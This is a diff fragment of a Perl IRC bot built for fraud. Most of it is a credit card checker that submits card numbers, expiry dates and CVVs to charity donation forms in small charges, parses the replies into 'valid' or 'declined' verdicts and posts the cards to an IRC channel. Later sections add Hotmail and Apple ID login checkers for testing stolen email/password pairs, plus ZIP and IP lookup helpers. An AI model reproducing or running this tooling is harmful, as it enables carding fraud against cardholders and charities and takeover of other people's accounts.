+&respond_to_privmsg(\%msg,"7,1[0Credit Card0: 7 $numerocarta 15 $expmes$expanio 14 $verifica 0,1This transaction has been 4Declined!!!");
+}elsif ($allo =~/The credit card number entered is not valid./){
+&respond_to_privmsg(\%msg,":85Credit Card: 14 9$numerocarta 14");
+&respond_to_privmsg(\%msg,"0,1[4,1ERROR0,1]8 CREDIT CARD IS4 INVALID!");
+}elsif ($allo =~/The following error message was returned: A duplicate transaction has been submitted./){
+&respond_to_privmsg(\%msg,"7,1[0Credit Card0: 7 $numerocarta 15 $expmes$expanio 14 $verifica 0,1This transaction has been 4Declined!!!");
+}elsif ($allo =~/ Error: Major Request Error/){
+&respond_to_privmsg(\%msg,"0,1[4,1ERROR0,1]8 CREDIT CARD IS4 INVALID!");
+}elsif ($allo =~/We apologize for technical difficulties. Your transmission did not go through. Try again in a few minutes./){
+&respond_to_privmsg(\%msg,"12,1[9Merchant down.....12]0 Try again in a few minutes.");
+}elsif ($allo =~/Thank for your generous donation to the Truro Historical Society./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~/Items in bold are required fields./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Invalid Credit Card number.");
+}elsif ($allo =~ /Click Here For a Printer Friendly Receipt.../){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~ /Thank you again for your partnership.../){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~/DECLINED CVV2/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!(DECLINED CVV2).");
+}elsif ($allo =~/The transaction has been declined because of an AVS.../){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!")
+}elsif ($allo =~/AVS.../){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~/ AVS.../){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~ /AVS.../){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~/The transaction has been declined because of an AVS./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!")
+}elsif ($allo =~/AVS./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~/ AVS/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~ /AVS./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~/Error:Credit Card Declined/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Error:Credit Card Declined");
+}elsif ($allo =~ /Error:Credit Card Declined/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Error:Credit Card Declined.");
+}elsif ($allo =~/Error: missing required information/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Error: missing required information.");
+}elsif ($allo =~ /Error: missing required information/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Error: missing required information.");
+}elsif ($allo =~ /Error.../){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Declined.Unknown error");
+}elsif ($allo =~/There has been a problem processing your donation. Too many attempts. Error Code 114/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Too many attempts!");
+}elsif ($allo =~/Thank for your generous donation to the Truro Historical Society./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~/This transaction has been declined./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(invalid)");
+}elsif ($allo =~/The credit card has expired./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(Expired)");
+}elsif ($allo =~/The credit card expiration date entered is not valid./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(Invalid)");
+}elsif ($allo =~/A duplicate transaction has been submitted./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(Recheck)");
+}elsif ($allo =~/The credit card number is invalid./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(invalid)");
+}elsif ($allo =~/Thank you! Your order will be processed pending a standard transaction review./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Thank you! Your order will be processed pending a standard transaction review.");
+}elsif ($allo =~/Credit Card Processing Error/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(error)");
+}elsif ($allo =~/Credit Card Number is invalid/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(invalid)");
+}elsif ($allo =~/The transaction has been declined because of an AVS mismatch. The address provided does not match billing address of cardholder./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~/'Please be sure that your billing information is correct and...'/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!");
+}elsif ($allo =~/Thank You!/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~/Thank You! Your payment has been successfully processed./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif ($allo =~/Insufficient funds./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4doesn't has funds for ur payment. do not honour!!4");
+}elsif ($allo =~/INSUFFICIENT FUNDS*/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!(INSUFFICIENT FUNDS*)");
+}elsif ($allo =~/The transaction has been completed successfully.../){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid!");
+}elsif($internal =~/This transaction has been declined./ || $internal =~/Lost or stolen card./){
+sendmsg($irc_socket, "PRIVMSG $channel 4,1[0,1Results......4,1]7,1 $pNick8,1 $cardnumber $expmonth.20$expyear $cvv 4,1is Declined");                      
+}elsif ($allo =~/Rejected: NO ACCOUNT./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Rejected: NO ACCOUNT.");
+}elsif ($allo =~/AUTHORIZATION./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Call for authorize transaction.");
+}elsif ($allo =~/Invalid expiration Date./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(invalid,Please check format (MMYY).)");
+}elsif ($allo =~/The credit card has expired./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(Expired)");
+}elsif ($allo =~/HOLD CARD * CALL./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined! HOLD CARD * CALL");
+}elsif ($allo =~/PICK UP CARD./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined! (PICK UP CARD)");
+}elsif ($allo =~/CALL./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined! (CALL BANK)");
+}elsif ($allo =~/Rejected: DECLINE./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined! (Rejected: DECLINE)");
+}elsif ($allo =~/CALL FOR./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined! (Call for authorize transaction.)");
+}elsif ($allo =~/The credit card expiration date entered is not valid./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(Invalid)");
+}elsif ($allo =~/A duplicate transaction has been submitted./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(Recheck)");
+}elsif ($allo =~/This transaction has been declined./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!");
+}elsif ($allo =~/The credit card number is invalid./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(invalid)");
+}elsif ($allo =~/Your Transaction has been declined. Please try again by clicking the following button.Response Message: PICK UP CARD       * CALL BANK          =./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Response Message: PICK UP CARD * CALL BANK=");
+}elsif ($allo =~/Thank you! Your order will be processed pending a standard transaction review./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Thank you! Your order will be processed pending a standard transaction review.");
+}elsif ($allo =~/Rejected: NO CHECK ACCOUNT./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Rejected: NO CHECK ACCOUNT.");
+}elsif ($allo =~/Invalid expiration Date. Please check format (MMYY)./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Invalid expiration Date. Please check format (MMYY).");
+}elsif ($allo =~/ Rejected: CARD NO. ERROR./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Rejected: CARD NO. ERROR.");
+}elsif ($allo =~/ Rejected: SERV NOT ALLOWED./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Rejected: SERV NOT ALLOWED.");
+}elsif ($allo =~/Invalid Credit Card number./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Invalid Credit Card number.");
+}elsif ($allo =~/We apologize for technical difficulties. Your transmission did not go through. Try again in a few minutes./){
+&respond_to_privmsg(\%msg,"12,1[9Merchant down.....12]0 Try again in a few minutes.");
+}elsif ($allo =~/Please be sure that your billing information is correct.../){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Declined!.");
+}elsif ($allo =~/try again/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Declined!.");
+}elsif ($allo =~/Error:Credit Card Declined/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Error:Credit Card Declined.");
+}elsif ($allo =~/SGS-002000:/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4SGS-002000: Declined.");
+}elsif ($allo =~/Decline Error: Payer's account is denied/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Decline Error: Payer's account is denied.");
+}elsif ($allo =~ /Decline Error: Payer's account is denied/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Decline Error: Payer's account is denied.");
+}elsif ($contentSlot =~/Decline Error: Payer's account is denied/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Decline Error: Payer's account is denied.");
+}elsif ($contentSlot =~ /Decline Error: Payer's account is denied/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Decline Error: Payer's account is denied.");
+}elsif ($contentSlot =~ /Error:Credit Card Declined/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Error:Credit Card Declined!");
+}elsif ($contentSlot =~/Error:Credit Card Declined/){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Error:Credit Card Declined!");
+}elsif ($allo =~/Rejected: NO ACCOUNT./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Rejected: NO ACCOUNT.");
+}elsif ($allo =~/AUTHORIZATION./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Call for authorize transaction.");
+}elsif ($allo =~/Invalid expiration Date./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(invalid,Please check format (MMYY).)");
+}elsif ($allo =~/The credit card has expired./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(Expired)");
+}elsif ($allo =~/HOLD CARD * CALL./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined! HOLD CARD * CALL");
+}elsif ($allo =~/PICK UP CARD./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined! (PICK UP CARD)");
+}elsif ($allo =~/CALL./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined! (CALL BANK)");
+}elsif ($allo =~/Rejected: DECLINE./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined! (Rejected: DECLINE)");
+}elsif ($allo =~/CALL FOR./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined! (Call for authorize transaction.)");
+}elsif ($allo =~/The credit card expiration date entered is not valid./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(Invalid)");
+}elsif ($allo =~/A duplicate transaction has been submitted./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(Recheck)");
+}elsif ($allo =~/This transaction has been declined./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!");
+}elsif ($allo =~/The credit card number is invalid./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Declined!(invalid)");
+}elsif ($allo =~/Your Transaction has been declined. Please try again by clicking the following button.Response Message: PICK UP CARD       * CALL BANK          =./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Response Message: PICK UP CARD * CALL BANK=");
+}elsif ($allo =~/Thank you! Your order will be processed pending a standard transaction review./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Thank you! Your order will be processed pending a standard transaction review.");
+}elsif ($allo =~/Rejected: NO CHECK ACCOUNT./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Rejected: NO CHECK ACCOUNT.");
+}elsif ($allo =~/Invalid expiration Date. Please check format (MMYY)./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4Invalid expiration Date. Please check format (MMYY).");
+}elsif ($allo =~/ Rejected: CARD NO. ERROR./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Rejected: CARD NO. ERROR.");
+}elsif ($allo =~/ Rejected: SERV NOT ALLOWED./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Rejected: SERV NOT ALLOWED.");
+}elsif ($allo =~/Invalid Credit Card number./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Invalid Credit Card number.");
+}elsif ($allo =~/We apologize for technical difficulties. Your transmission did not go through. Try again in a few minutes./){
+&respond_to_privmsg(\%msg,"12,1[9Merchant down.....12]0 Try again in a few minutes.");
+}elsif ($allo =~/Items in bold are required fields./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 4 Invalid Credit Card number.");
+}elsif ($allo =~/Your generous donation will be appreciated by all who visit and enjoy the San Luis Obispo Museum of Art./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9NON vbv valid!");
+}elsif ($allo =~/Thank You./){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9NON vbv valid!");
+}elsif ($allo =~/The transaction has been declined because of an AVS.../){
+&respond_to_privmsg(\%msg,"12,1[9ResuLT.....12]0 $numerocarta 07$expmes$expanio08 $verifica 9valid! (AVS mismatch)");
+}
+}
+
+		if($msg{'what'} =~ /\!amex\s(\d{15})\s(\d{2})(\d{2})\s(\d{4})/)
+		{
+		my ($numerocarta,$expmese,$expanno,$verifica) = ($1,$2,$3,$4);
+		&respond_to_privmsg(\%msg,"15[7CHECKiNGCARD15] CHECKiNG... 07 -$numerocarta- 12 -$expmese- 09 -$expanno- CVV -$verifica- ");
+#print "inizio mechanize\n";
+if (substr($numerocarta,0,1)==6) {
+	&respond_to_privmsg(\%msg,"15[7CHECKiNGCARD15]  $numerocarta is 09AmericanExpress ");
+}
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+  $agent->get('http://www.ucpcfl.org/general-donation.php');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  $agent->form_number(1);
+  { local $^W; $agent->current_form->value('ssl_first_name', 'Rossi'); };
+  { local $^W; $agent->current_form->value('ssl_last_name', 'Mario'); };
+  { local $^W; $agent->current_form->value('ssl_amount', '5'); };
+  { local $^W; $agent->current_form->value('ssl_email', 'suka100@live.it'); };
+  { local $^W; $agent->current_form->value('ssl_avs_address', 'via penale 192'); };
+  { local $^W; $agent->current_form->value('ssl_city', 'Milan'); };
+  { local $^W; $agent->current_form->value('ssl_state', 'Lombardy'); };
+  { local $^W; $agent->current_form->value('ssl_avs_zip', '20100'); };
+  { local $^W; $agent->current_form->value('ssl_country', 'Midighan'); };
+  { local $^W; $agent->current_form->value('ssl_phone', '03435353535'); };
+  { local $^W; $agent->current_form->value('ssl_card_number', ''.$numerocarta.''); };
+  { local $^W; $agent->current_form->value('ssl_exp_date', ''.$expmese.''); };
+  { local $^W; $agent->current_form->value('ssl_cvv2cvc2', ''.$verifica.''); };
+  { local $^W; $agent->current_form->value('cardnum', ''.$numerocarta.''); };
+  $agent->submit();
+  #print $agent->content,"\n";
+my $allo=$agent->content;
+if ($allo =~/APPROVED/){
+						my $database = "banklist.txt";
+						open FILE,"$database" or die "Errore nell'apertura: $!";
+						my @results=<FILE>;
+						close FILE;
+						my $bankinfo = $1;
+if ($allo =~/<td>M<input type=\"hidden\" name=\"ssl_cvv2_response\" value=\"(.*?)\"><\/td>/){
+					&respond_to_privmsg(\%msg,"15[09CARD15] CARD 03APPROVED TRANSACTION AT 095USD $numerocarta EXP $expmese$expanno CVV $verifica 08CVV=>12 $1 ");
+					$irc_socket->write("PRIVMSG #ccspam :15[09CARD15] CARD 03APPROVED TRANSACTION AT 095USD $numerocarta EXP $expmese$expanno CVV $verifica 08CVV=>12 $1 \r\n");
+}
+my $nuova = substr($numerocarta,0,6);
+foreach my $url (@results){
+if($url =~ m/$nuova\|(.*)/){
+					&respond_to_privmsg(\%msg,"15[12BANK08-12$nuova15]09 $bankinfo ");
+#print "card $variable!";
+}
+}
+}elsif ($allo =~/APPROVAL/){
+						my $database = "banklist.txt";
+						open FILE,"$database" or die "Errore nell'apertura: $!";
+						my @results=<FILE>;
+						close FILE;
+						my $bankinfo = $1;
+if ($allo =~/<td>M<input type=\"hidden\" name=\"ssl_cvv2_response\" value=\"(.*?)\"><\/td>/){
+					&respond_to_privmsg(\%msg,"15[09CARD15] CARD 03APPROVED TRANSACTION AT 095USD $numerocarta EXP $expmese$expanno CVV $verifica 08CVV=>12 $1 ");
+					$irc_socket->write("PRIVMSG #ccspam :15[09CARD15] CARD 03APPROVED TRANSACTION AT 095USD $numerocarta EXP $expmese$expanno CVV $verifica 08CVV=>12 $1 \r\n");
+}
+my $nuova = substr($numerocarta,0,6);
+foreach my $url (@results){
+if($url =~ m/$nuova\|(.*)/){
+my $bankinfo = $1;
+					&respond_to_privmsg(\%msg,"15[12BANK08-12$nuova15]09 $bankinfo ");
+#print "card $variable!";
+}
+}
+}elsif ($allo =~/PICK UP CARD/){
+&respond_to_privmsg(\%msg,"15[09CARD15]Card -$numerocarta- is04 Declined11 (PICK UP CARD) ");
+print "declined";
+}elsif ($allo =~/DECLINED/){
+&respond_to_privmsg(\%msg,"15[09CARD15]Card -$numerocarta- is04 Declined11 ");
+print "declined";
+}elsif ($allo =~/INVALID/){
+&respond_to_privmsg(\%msg,"15[09CARD15]Card -$numerocarta- is04 Declined11 (INVALID) ");
+print "declined";
+}
+elsif ($allo =~/Please select a different card/){
+&respond_to_privmsg(\%msg,"15[09CARD15]Card -$numerocarta- is07 Please Merchant dont accept this cards! select different cards ");
+print "different";
+}
+}
+		if($msg{'what'} =~ /\!delete (.*)/)
+		{
+		my ($deletefile) = ($1);
+chop($deletefile);
+		&respond_to_privmsg(\%msg,"15[7UPLOADiNG15] Deleting File... -$deletefile- ");
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+ $agent->get(''.$deletefile.'');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  #print $agent->content,"\n";
+my $namedelete=$agent->content;
+if ($namedelete =~/<font size=\"2\">You are about to delete the folowing file: <b>(.*?)<\/b><\/font><br><br>/){
+		&respond_to_privmsg(\%msg,"15[7UPLOADiNG15] Deleting ... - $1 - ");
+}
+  $agent->submit();
+  #print $agent->content,"\n";
+my $compdel=$agent->content;
+if ($compdel =~/The file has been successfully deleted/){
+		&respond_to_privmsg(\%msg,"15[7UPLOADiNG15] Thank you. The file has been successfully deleted from sendspace ");
+}
+}
+
+
+#####################################################################################
+#############################@@@@======Logins Checkers=====@@@@#############################
+#############################CONTACT ME : w00t@hotmail.com################################
+############################################################################################
+ 
+########################################################################################
+if($msg{'what'} =~ /^!hotmail\s+(.*) (.*)/) {
+my ($hotmailz,$hotpasswordx) = ($1,$2);
+chop($hotpasswordx);
+ &respond_to_privmsg(\%msg,"14,1[15,1 HotMaiL 14,01]00,01 Checking 08$hotmailz:$hotpasswordx");
+ my $agent = WWW::Mechanize->new( autocheck => 1 );
+ my $formfiller = WWW::Mechanize::FormFiller->new();
+ $agent->env_proxy();
+ $agent->get("https://login.live.com/ppsecure/secure.srf?lc=1040&id=9&ru=https://accountservices.msn.com/default.srf%3Fvv%3D900%26mkt%3DIT-IT%26lc
+ 
+%3D1040&tw=1200&fs=1&kv=9&ct=1292072944&ems=1&seclog=10&ver=9.0.16542.0&tpf=1ce7cecf4f2ef04eefb126a0d68f97b0");
+ $agent->form_number(1);
+ $agent->current_form->value('login', ''.$hotmailz.'');
+ $agent->current_form->value('passwd', ''.$hotpasswordx.'');
+ $agent->submit();
+# print $agent->content,"\n";
+ my $internal = $agent->content;  
+ if ($internal =~/Windows Live ID/) {
+  &respond_to_privmsg(\%msg,"14,1[15,1 HotMaiL 14,01]08,01 $hotmailz:$hotpasswordx 04Wrong login");
+ }else{
+  &respond_to_privmsg(\%msg,"14,1[15,1 HotMaiL 14,01]08,01 $hotmailz:$hotpasswordx 09Successfully Logged in");
+ }
+}
+########################################################################################
+########################################################################################
+if($msg{'what'} =~ /^!apple\s+(.*?)\s+(.*)/){
+                my ($email,$pass) = ($1,$2);
+                chop($email,$pass);
+                   &respond_to_privmsg(\%msg,"14,1[15Apple......14]15,1 Checking 08,1 $email:$pass");
+ my $agent = WWW::Mechanize->new( autocheck => 1 );
+ my $formfiller = WWW::Mechanize::FormFiller->new();
+ $agent->env_proxy();
+ $agent->get("https://daw.apple.com/cgi-bin/WebObjects/DSAuthWeb.woa/wa/login?
+ 
+appIdKey=49bd208126787c17c33ca3b14d2a4f0c92daa10c417c4d686140e4acc04ba5f4&path=/Login.do%3FmyInfoReturnURL%3Dhttps%253A%252F%252Fselfsolve.apple.com
+ 
+%252FGetAgreements.do&myInfoReturnURL=https%253A%252F%252Fselfsolve.apple.com%252FGetAgreements.do&language=IT-IT");
+ $agent->form_number(2);
+ $agent->current_form->value('theAccountName', ''.$email.'');
+ $agent->current_form->value('theAccountPW', ''.$pass.'');
+ $agent->submit();
+ $agent->reload();
+ #  print $agent->content,"\n";
+ my $internal = $agent->content;
+ my $allo=$agent->content;
+      open(FILE3,">>Apple.html") or die "$!";
+       #print FILE3 "$allo\n";
+           close FILE3;
+ sleep(2);
+ if($internal =~/Did you forget/) {
+  &respond_to_privmsg(\%msg,"14,1[15Apple......14]8,1 $email:$pass 4Wrong Login ");
+   }
+ elsif($internal =~/blocked/) {
+  &respond_to_privmsg(\%msg,"14,1[15Apple......14]8,1 $email:$pass 4,1(Account Locked)");
+ }  elsif($internal =~ /<BODY BGCOLOR=#FFFFFF>/) {
+ my $name = $1;
+ my $surname = $2;
+  &respond_to_privmsg(\%msg,"14,1[15Apple......14]8,1 $email:$pass 9,1Successfully Logged in");
+ }  
+ }
+ 
+ 
+#############################@@@@======ANOTHER TOOLZ=====@@@@###############################
+#############################CONTACT ME : w00t@hotmail.com################################
+############################################################################################
+if($msg{'what'} =~ /^$zipcmd\s(\d{5})/)
+                {
+                my ($zipcheck) = ($1);
+                &respond_to_privmsg(\%msg,"14,1[ 15Zip14 ]0,1 Checking...08 $zipcheck");
+#print "\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+$agent->get('http://www.zipinfo.com/cgi-local/zipsrch.exe?cnty=cnty&ac=ac&zip=');
+$agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+ { local $^W; $agent->current_form->value('zip', ''.$zipcheck.''); };
+ $agent->submit();
+ #print $agent->content,"\n";
+my $zipse=$agent->content;
+if ($zipse =~/<td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font><\/td><td
+ 
+align=center>(.*)<\/font><\/td><td align=center>(.*)<\/font>/g){
+my ($city) = ($1);
+my ($state) = ($2);
+                &respond_to_privmsg(\%msg,"14,1[ 15Zip14 ]3 $city | $state");
+}
+elsif ($zipse =~/is not currently assigned by the US Postal Service to any city./){
+                &respond_to_privmsg(\%msg,"14,1[ 15Zip14 ]8 $zipcheck04 NOT FOUND!");
+}
+}
+#####################################################################################
+        if($msg{'what'} =~ /^$ipcmd (.*)/)
+                {
+                my ($ipcheck) = ($1);
+                &respond_to_privmsg(\%msg,"14,1[ 9ip14 ]0,1 Checking...08 $ipcheck");
+#print "\n";
+my $agent = WWW::Mechanize->new( autocheck => 1 );
+my $formfiller = WWW::Mechanize::FormFiller->new();
+$agent->env_proxy();
+ $agent->get('http://www.ipligence.com/geolocation');
+  $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+ { local $^W; $agent->current_form->value('ip', ''.$ipcheck.''); };
+ $agent->submit();
+ #print $agent->content,"\n";
+my $ipse=$agent->content;
